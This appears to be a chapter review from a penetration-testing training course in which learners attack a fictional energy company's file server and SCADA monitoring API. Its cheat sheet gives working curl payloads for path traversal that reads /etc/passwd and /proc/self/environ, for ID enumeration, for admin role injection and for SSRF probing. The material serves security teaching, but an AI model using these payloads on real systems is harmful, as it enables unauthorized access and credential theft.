    Chapter 3 Review: Infrastructure Attacks

    What You Accomplished

    Chapter 3 moved the engagement from web applications to internal infrastructure. Two exercises targeted systems that Meridian Energy employees rely on daily: a document management system and a SCADA monitoring API. Both services were built for internal use, and both assumed that authenticated users would behave as expected.

    Exercise Target Vulnerability Impact
    MEG3.1 File Server Path traversal Read arbitrary files including SCADA credentials
    MEG3.2 Monitoring API IDOR + Mass assignment + SSRF Full admin access, internal service compromise

    Infrastructure Attack Methodology

    The exercises in this chapter follow a pattern that applies to any internal service assessment:

    graph TD
    A["Authenticate with<br/>valid credentials"] --> B["Enumerate endpoints<br/>and functionality"]
    B --> C["Identify input<br/>handling flaws"]
    C --> D{"Flaw type?"}
    D -->|"File path"| E["Path traversal"]
    D -->|"Object ID"| F["IDOR enumeration"]
    D -->|"JSON fields"| G["Mass assignment"]
    D -->|"URL parameter"| H["SSRF"]
    E --> I["Read sensitive<br/>files"]
    F --> J["Access unauthorized<br/>data"]
    G --> K["Escalate<br/>privileges"]
    H --> L["Reach internal<br/>services"]
    I --> M["Chain findings<br/>into next phase"]
    J --> M
    K --> M
    L --> M

    The key insight: internal services are often more vulnerable than public-facing applications because developers assume the network perimeter provides sufficient protection. Once an attacker has valid credentials and network access (which earlier phases provided), internal services become high-value, low-resistance targets.

    Vulnerability Quick Reference

    Path Traversal

    Item Detail
    Attack vector Manipulate file path parameters with ../ sequences
    Detection Review all file-handling code for user-controlled path components
    Prevention Canonicalize paths and verify they start with the expected root
    Encoding bypasses %2e%2e%2f, %252e%252e%252f, ..%c0%af, ....//

    IDOR

    Item Detail
    Attack vector Access resources by changing ID parameters without authorization
    Detection Test every endpoint with IDs belonging to other users and roles
    Prevention Server-side authorization check on every resource access
    Common locations REST endpoints with numeric or UUID path parameters

    Mass Assignment

    Item Detail
    Attack vector Include unexpected fields in JSON update requests
    Detection Send additional fields and observe if they persist
    Prevention Server-side field allowlisting on all update endpoints
    High-value fields role, is_admin, permissions, email_verified, account_type

    SSRF

    Item Detail
    Attack vector Supply internal URLs to server-side fetch functionality
    Detection Look for endpoints that accept URL parameters or fetch external content
    Prevention URL allowlisting, egress filtering, internal service authentication
    Common targets http://127.0.0.1, http://169.254.169.254, internal hostnames

    Cheat Sheet: Infrastructure Testing Commands

    Path Traversal:

    # Basic traversal
curl -b cookies.txt "http://target/download?file=../../../etc/passwd"

# URL-encoded traversal
curl -b cookies.txt "http://target/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Double-encoded traversal
curl -b cookies.txt "http://target/download?file=%252e%252e/%252e%252e/etc/passwd"

# Process info via /proc
curl -b cookies.txt "http://target/download?file=../../../proc/self/environ"

    API Authentication:

    # Login and capture token
TOKEN=$(curl -s -X POST http://api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@corp","password":"pass"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Use token in requests
curl -s -H "Authorization: Bearer $TOKEN" http://api/endpoint

    IDOR Enumeration:

    # Sequential ID enumeration
for i in $(seq 1 100); do
  curl -s -H "Authorization: Bearer $TOKEN" http://api/resource/$i
done

    Mass Assignment:

    # Include unexpected field in update
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Normal","role":"admin"}' \
  http://api/user/profile

    SSRF:

    # Internal service probe
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-host:5000/secrets"}' \
  http://api/admin/fetch

    Connection to Chapter 4

    The infrastructure attacks in Chapter 3 accomplished two things: they demonstrated that Meridian Energy's internal services lack basic security controls, and they provided additional credentials and intelligence for the final phase.

    Chapter 4 targets the crown jewel: the IT administration portal. Protected by LDAP authentication and serving a report generator built with Jinja2 templates, the admin portal is the last barrier between you and the engineering database. The SCADA credentials from the file server traversal and the API intelligence from the monitoring system both feed into the final attack chain.

    The capstone exercise chains LDAP injection, server-side template injection, credential discovery, and lateral movement into a single attack sequence. Every technique you have practiced in Chapters 1 through 3 comes together in Chapter 4.

    Self-Assessment

    Before moving to Chapter 4, verify that you can answer these questions without looking at the walkthroughs:

    • Can you explain why ../ traverses up one directory level?
    • Can you URL-encode a traversal sequence by hand?
    • Can you describe the difference between horizontal and vertical IDOR?
    • Can you explain why client-side field filtering does not prevent mass assignment?
    • Can you describe how SSRF turns a web application into a proxy?
    • Can you explain why internal services that trust source IPs are vulnerable to SSRF?
    • Can you map each vulnerability to its MITRE ATT&CK technique?

    If any of these are unclear, review the relevant exercise before proceeding. The capstone builds on every concept covered so far.
